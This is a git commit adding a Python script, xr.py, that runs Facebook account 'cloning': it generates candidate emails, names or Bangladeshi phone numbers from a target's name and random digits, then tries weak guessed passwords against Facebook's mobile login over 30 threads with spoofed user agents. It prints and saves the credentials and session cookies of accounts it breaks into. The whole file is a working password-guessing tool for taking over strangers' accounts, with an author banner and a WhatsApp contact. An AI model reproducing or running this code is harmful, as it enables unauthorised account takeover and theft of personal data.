43fff3586681a70d8efb2d0d5ccdcbcc4ffde034
Itz Jisan <127544614+Itzjisan@users.noreply.github.com>
2023-03-26 21:44:05 +0600

    d
    d

---
+++ xr.py
@@ -0,0 +1,112 @@
+j=' [💉] target last name :  '
+i=' [💉]  target fast name : '
+h='\x1b[1;97m'
+g='\x1b[1;91m'
+c=' [♥] Ids saved in ok.txt,cp.txt'
+b=' [♥] Crack process has been completed'
+a=' [♥]  Wait for ids '
+Z=' \x1b[1;97m[♥]  The process has been started'
+Y=' [♥]  Total ids:\x1b[1;92m '
+X='[?] How many numbers do you want to add : '
+W=int
+R='12345'
+Q='1234'
+P='123'
+N=''
+K=len
+I='clear'
+H=str
+F='_'
+E=range
+B=input
+A=print
+import os as C,sys as J,time,json,random as D,re,string as M,platform,base64,uuid
+from bs4 import BeautifulSoup as w,BeautifulSoup
+import requests as x
+from datetime import date
+from datetime import datetime as d
+from time import sleep
+from os import system as y
+from time import sleep as z
+try:import requests as e;from concurrent.futures import ThreadPoolExecutor as S;import mechanize;from requests.exceptions import ConnectionError
+except ModuleNotFoundError:C.system('pip install mechanize requests futures bs4==2 > /dev/null');C.system('pip install bs4')
+A0=g
+A1=h
+A2='\x1b[1;32m'
+A3='\x1b[1;33m'
+A4='\x1b[1;34m'
+A5='\x1b[1;35m'
+A6=h
+A7=g
+A8='\x1b[1;92m'
+A9='\x1b[1;93m'
+AA='\x1b[1;94m'
+AB='\x1b[1;95m'
+AC='\x1b[1;96m'
+AD='\x1b[0m'
+AE='\x1b[1;90m'
+AF='\x1b[1;107m'
+AG='\x1b[1;106m'
+AH='\x1b[1;105m'
+AI='\x1b[1;104m'
+AJ='\x1b[1;103m'
+AK='\x1b[1;102m'
+AL='\x1b[1;101m'
+AM='\x1b[1;100m'
+k=d.now()
+AN=k.strftime('%H:%M')
+T=d.now()
+AO=T.year
+AP=T.month
+AQ=T.day
+AR=date.today()
+L=0
+O=[]
+U=[]
+AS=[]
+f=[]
+AT=[]
+AU=e.Session()
+AV=[]
+for AW in E(10000):l='Nokia';m=D.choice(['A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z']);n=D.randrange(1,99);o='/GoBrowser/';p='1.6.0.';q=D.randrange(1,99);r=f"{l}{m}{n}{o}{p}{q}";f.append(r)
+G="\x1b[1;37m\n              _____ _____   ______        _      ____  _____  \n   |_   _|_   _|.' ____ \\      / \\    |_   \\|_   _| \n     | |   | |  | (___ \\_|    / _ \\     |   \\ | |   \n _   | |   | |   _.____`.    / ___ \\    | |\\ \\| |   \n| |__' |  _| |_ | \\____) | _/ /   \\ \\_ _| |_\\   |_  \n`.____.' |_____| \\______.'|____| |____|_____|\\____| \n                                                    \n\n    ┌───────────────────────────────────────┐\n    │ [✓] AUTHOR   : HAMIM UDDIN JISAN            │\n    │ [✓] GITHUB   : SPY-1x1                │\n    │ [✓] WHATSAPP : +8801814649133         │\n    │ [✓] POWER BY : \x1b[1;32m ITZ JISAN \x1b[1;37m           │\n    └───────────────────────────────────────┘"
+class s:
+	def __init__(D):
+		D.id=[];D.ok=[];D.cp=[];D.loop=0;C.system(I);A(G);A(' [1] Facebook CLONING (Email) ');A(' [2] Facebook CLONING (Name)');A(' [3] Facebook CLONING (BD number)');A(' [4] Get this script open code ');A(' [0] Exit');E=B(' [√] Choose : ')
+		if E in['1','01']:t()
+		if E in['2','02']:u()
+		if E in['3','03']:v()
+		if E in[' 0','00']:exit()
+		else:exit()
+def t():
+	O=[];C.system(I);A(G);J=B(i);L=B(j);A(' [🤝] example Doamin : @gmail.com, @yahoo.com ');T=B(' [📧]  Input Doamin  : ');e=W(B(X))
+	for l in E(e):f=N.join((D.choice(M.digits)for A in E(1,4)));O.append(f)
+	with S(max_workers=30)as g:
+		C.system(I);A(G);U=H(K(O));A(Y+U);A(f"[1;97m [♥]  Target Doamin:[1;92m {T}");A(Z);A(a);A(50*F)
+		for d in O:h=J+L+d+T;k=[J,L,J+L,J+P,J+Q,J+R,J+d,L+P,L+Q,L+R];g.submit(V,h,k,U)
+	A(50*F);A(b);A(c);A(50*F)
+def u():
+	O=[];C.system(I);A(G);J=B(i);L=B(j);d='.';e=W(B(X))
+	for l in E(e):f=N.join((D.choice(M.digits)for A in E(1,4)));O.append(f)
+	with S(max_workers=30)as g:
+		C.system(I);A(G);T=H(K(O));A(Y+T);A(f"[1;97m [♥]  Target Doamin:[1;92m Facebook CLONING (name)");A(Z);A(a);A(50*F)
+		for U in O:h=J+d+L+U;k=[J,L,J+L,J+P,J+Q,J+R,J+U,L+P,L+Q,L+R];g.submit(V,h,k,T)
+	A(50*F);A(b);A(c);A(50*F)
+def v():
+	P=[];C.system(I);A(G);Q=B(' [💉] Enter sim code: ');J=N.join((D.choice(M.digits)for A in E(2)));L=N.join((D.choice(M.digits)for A in E(2)));T=' Facebook CLONING (BD number) ';U=W(B(X))
+	for h in E(U):d=N.join((D.choice(M.digits)for A in E(4)));P.append(d)
+	with S(max_workers=30)as e:
+		C.system(I);A(G);R=H(K(P));A(Y+R);A(f"[1;97m [♥]  Target Doamin:[1;92m {T}");A(Z);A(a);A(50*F)
+		for O in P:f=Q+J+L+O;g=[Q+J+L+O,L+O,J+O,Q+J+L,'bangladesh'];e.submit(V,f,g,R)
+	A(50*F);A(b);A(c);A(50*F)
+def V(OO0O0O0O00O0O000O,OO00O000O000OO0OO,OOO00O0OO0O0OOOO0):
+	N=' | ';B=OO0O0O0O00O0O000O;global L;global U;global O;global AX
+	try:
+		for C in OO00O000O000OO0OO:
+			Q=D.choice(f);E=e.Session();J.stdout.write('\r[\x1b[1;92mSPY1x1\x1b[1;97m] [%s/%s] [\x1b[1;92mOK\x1b[1;97m:-\x1b[1;92m%s\x1b[1;97m] [\x1b[1;91mCP\x1b[1;97m:-\x1b[1;91m%s\x1b[1;97m] \r'%(L,OOO00O0OO0O0OOOO0,K(O),K(U))),;J.stdout.flush();F=E.get('https://mbasic.facebook.com').text;P={'lsd':re.search('name="lsd" value="(.*?)"',H(F)).group(1),'jazoest':re.search('name="jazoest" value="(.*?)"',H(F)).group(1),'m_ts':re.search('name="m_ts" value="(.*?)"',H(F)).group(1),'li':re.search('name="li" value="(.*?)"',H(F)).group(1),'try_number':'0','unrecognized_tries':'0','email':B,'pass':C,'login':'Log In'};R={'authority':'web.facebook.com','accept':'*/*','accept-language':'en-GB,en-US;q=0.9,en;q=0.8','content-type':'application/x-www-form-urlencoded','origin':'https://web.facebook.com','referer':'https://web.facebook.com/login.php/?_rdc=1&_rdr','sec-ch-ua':'"Chromium";v="107", "Not=A?Brand";v="24"','sec-ch-ua-mobile':'?1','sec-ch-ua-platform':'"Android"','sec-fetch-dest':'empty','sec-fetch-mode':'cors','sec-fetch-site':'same-origin','user-agent':'Mozilla/5.0 (Linux; Android 10; Redmi 8A Dual) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36','x-asbd-id':'198387','x-fb-lsd':'AVoavx2nUjg'};S=E.post('https://mbasic.facebook.com/login/device-based/regular/login/?refsrc',data=P,headers=header_freefb).text;I=E.cookies.get_dict().keys()
+			if'c_user'in I:G=';'.join([A+'='+B for(A,B)in E.cookies.get_dict().items()]);M=G[7:22];A(f"[38;5;46m[ok] {B}|{C}");A(f" \n Cookie : {G}");open('/sdcard/SPY/ok.txt','a').write(B+N+C+'\n');O.append(B);break
+			elif'checkpoint'in I:G=';'.join([A+'='+B for(A,B)in E.cookies.get_dict().items()]);M=G[82:97];A(f"[38;5;196m[cp] {M}|{C}");open('/sdcard/SPY-CP.txt','a').write(B+N+C+' \n');U.append(B);break
+			else:continue
+		L+=1;J.stdout.write(f"\r[m[SPY1x1] [1;92m%s[m |[m[[mOK:[1;92m%s[m] "%(L,K(O))),;J.stdout.flush()
+	except:pass
+s()
